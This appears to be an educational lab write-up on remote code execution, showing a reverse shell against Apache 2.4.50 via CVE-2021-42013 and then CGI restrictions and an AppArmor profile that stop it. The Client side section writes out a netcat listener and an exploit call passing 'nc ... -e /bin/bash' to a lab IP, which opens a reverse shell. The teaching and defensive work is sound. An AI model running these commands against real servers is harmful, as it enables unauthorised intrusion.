# Introduction

In this paper I describe the process behind the security attack called
*Remote Code Execution* (RCE).

This allows an attacker to run arbitrary code on a vulnerable remote
machine, with effects that can vary broadly depending on the type of
payload.

Specifically, I demonstrate how to get a *Reverse Shell* given an
instance of the Apache HTTP Server version 2.4.50.

# What is RCE?

[Remote Code Execution](https://www.avocadosys.com/remote-code-execution-what-is-it-and-how-to-prevent-it) is one of the most severe attacks that can be
launched to servers and applications. In fact it allows the attacker to
execute arbitrary code on the target machine without needing to have
credentials to access the machine or being physically close to it.

An attacker crafts a specific payload to send to the target machine
which then gets executed, possibly without triggering any alarm on the
target machine. Depending on the type of payload injected, the attacker
could chain other attacks and gain full control of the system causing
denial of service, gaining more privileges (privilege escalation),
setting up a backdoor or stealing information and files.

## What is the attack process?

1.  The attacker starts by analysing the target machine for potential
    vulnerabilities.

2.  Once a vulnerability suitable for RCE is identified, the attacker
    tries to exploit it by crafting a specific payload, for example by
    taking advantage of a particular language feature.

3.  They payload is then sent to the target machine and evaluated and
    the result sent back to the attacker.

4.  The attack is completed per se, but other attacks can be chained.

## How to prevent this type of attack?

The first rule when it comes to security is to always keep up-to-date
with the latest security patches and software updates.

Even if this is the case, there is always the possibility that a
vulnerability might exist and that a zero-day exploit could take
advantage of it.

To minimise the risks, a correct strategy should be identified for every
critical part of the software. Sanitising user inputs has proven to be
one of the most effective security measure to prevent this type of
attack, for example.

Although many security measures are put in place, it may not be possible
to prevent all of the attacks. This is why having an alerting system is
crucial to be able to promptly respond to and minimise damage. Such
systems are called [*SIEM*](https://www.ibm.com/topics/siem) (Security Information and Event Management)
and they offer real-time monitoring and analysis of events as well as
tracking and logging of security data for compliance or auditing
purposes.

# Remote Shell

When it comes to taking control of a target system, the most powerful
way is for the attacker to obtain a shell. There are [two different approaches](https://medium.com/@PenTest_duck/bind-vs-reverse-vs-encrypted-shells-what-should-you-use-6ead1d947aa9):

-   Bind Shell

-   Reverse Shell

## Bind Shell

This first approach relies on the target machine listening for incoming
connections to a specific port. It essentially acts as a server which
grants the client access to its shell.

As long as the IP address and port of the target machine are known,
anyone could connect, except there is typically a firewall which filters
incoming connections and/or the real IP address and port could be
shadowed by the NAT.

## Reverse Shell

This second approach relies on the attacker machine listening for
incoming connections to a specific port. It is then the target machine
which connects to the attacker and exposes its shell.

This approach solves the pitfalls of the previous one as the attacker
does not need to know the IP address and port of the target machine.

Most importantly, the firewall rules typically apply only to inbound
connections, so not in the case of the machine opening an outbound
connection.

# Setup

To perform the attack I exploited a vulnerability reported and
classified as [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013) by the NIST.

## Server side

For it to work, the target machine must be running a vulnerable version
of the Apache HTTP Server with CGI enabled:

1.  I installed the version 2.4.50 and modified the configuration file
    *httpd.conf* to enable CGI functionality:

    -   I un-commented the line of code that loads the *cgid_module*:

            LoadModule cgid\_module modules/mod\_cgid.so

    -   Then enabled CGI for all server directories by setting:

            <Directory />
                AllowOverride none
                Require all granted
            </Directory>

2.  I started the server by navigating into */usr/local/apache2/bin* and
    running *sudo apachectl start*

## Client side

I downloaded a [bash script](https://www.exploit-db.com/exploits/50406) to exploit the vulnerability and
made some little modifications myself. The script creates a HTTP request
with a particular route pointing to the shell executable on the target
machine, by performing a path traversal attack. Then it forwards the
given command to this shell, which gets evaluated and, in this case,
causes the target machine to return a shell.

This is the list of steps taken to perform the attack:

1.  I started netcat in listening mode by issuing:

        nc -lvnp 2345

2.  Then I ran the script using a slightly modified command to work with
    my version:

        bash /shared/exploit.bash 192.168.180.145 bin/sh
        "nc 192.168.180.145 2345 -e /bin/bash"

    and got the reverse shell up and running.

# Prevention

I also tried different ways of preventing such attack from working.

## Restricting CGI directories

The first solution is to allow CGI scripts to be loaded and executed
only from specified directories.

This can be achieved by:

-   Reverting to:

        <Directory />
            AllowOverride none
            Require all denied
        </Directory>

-   Setting execution from a specific directory:

        <Directory "/usr/local/apache2/cgi-bin">
            AllowOverride None
            Options +ExecCGI
            Require all granted
        </Directory>

## AppArmor

[AppArmor](https://www.apparmor.net) is a Linux security system which supplements the traditional
Unix discretionary access control (DAC) model by providing mandatory
access control (MAC) and is provided out-of-the-box in the Linux kernel,
since version 2.6.36.

For this approach to work, It requires creating a new AppArmor profile
for the apache server and defining the security policies to enforce.

After some trial and error I came up with a working profile which denies
the execution of shells, effectively preventing the RCE attack, while
still allowing valid requests to be carried out.

This is the resulting policy:

    #include <tunables/global>

    /usr/local/apache2/bin/httpd {
      #include <abstractions/apache2-common>
      #include <abstractions/base>
      #include <abstractions/bash>

      capability chown,
      capability kill,
      capability setgid,
      capability setuid,

      signal send set=term peer=unconfined,

      deny /usr/bin/bash x,
      deny /usr/bin/dash x,
      deny /usr/bin/sh x,

      /usr/bin/python3.8 r,
      /usr/local/apache2/cgi-bin/* rix,
      /usr/local/apache2/htdocs/index.html r,
      /usr/local/apache2/logs/* w,
      /usr/local/lib/python3.8/dist-packages/ r,
      owner /usr/local/apache2/conf/httpd.conf r,
      owner /usr/local/apache2/conf/mime.types r,
      owner /usr/local/apache2/logs/* rw,
      owner /usr/local/apache2/modules/* mr,
    }
